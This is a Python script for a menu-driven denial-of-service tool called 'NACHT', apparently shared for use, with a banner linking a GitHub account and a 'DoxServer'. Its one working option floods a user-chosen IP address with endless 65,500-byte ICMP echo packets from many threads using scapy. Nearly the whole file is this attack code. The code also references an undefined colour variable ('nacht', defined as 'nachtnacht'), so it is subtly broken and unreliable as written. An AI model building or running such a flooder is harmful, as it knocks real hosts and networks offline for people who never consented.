import os
import random
import threading
import time
import sys
from scapy.all import IP, ICMP, send

nachtnacht = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{nacht}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██████╗ 
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██╗
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝     █████╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗     ╚═══██╗
███████╗██║  ██║   ██║   ███████╗██║  ██║    ██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {nacht}*{clear} Github    {nacht}:{clear}   https://github.com/madanokr001      ║
║ {nacht}*{clear} DoxServer {nacht}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {nacht}*{clear} version   {nacht}:{clear}   4.0                                 ║
║ {nacht}*{clear} NACHT      {nacht}:{clear}   {nacht}[{clear}{white}LAYER3{clear}{nacht}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {nacht}[{clear}1{nacht}]{clear} ICMP Flood Attack                               ║                   
║ {nacht}[{clear}3{nacht}]{clear} Exit NACHT                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer3():
    while True:
        logo()
        select = input(f"""
╔═══[{nacht}root{clear}@{nacht}NACHT{clear}]
╚══{nacht}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            def send_packet(target):
                try:
                    while True:
                        payload = random._urandom(65500)  
                        packet = IP(dst=target) / ICMP(type=8, chksum=None) / payload

                        send(packet, verbose=False)

                        print(f"[{nacht}NACHT{clear}] IP Address {nacht}:{clear} {target} {nacht}|{clear} ICMP Packet {nacht}:{clear} {white}65500{clear}")

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Check your permissions or install {nacht}Npcap{clear} : https://npcap.com/#download")
                    time.sleep(2)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)

            def start_threads(target, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target,))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{nacht}NACHT{clear}] IP {nacht}>{clear} ")
            threads = int(input(f"[{nacht}NACHT{clear}] THREAD {nacht}>{clear} "))

            start_threads(target, threads)
            

        elif select == "3" or select.lower() == "3":
            sys.exit()



if __name__ == "__main__":
    layer3()
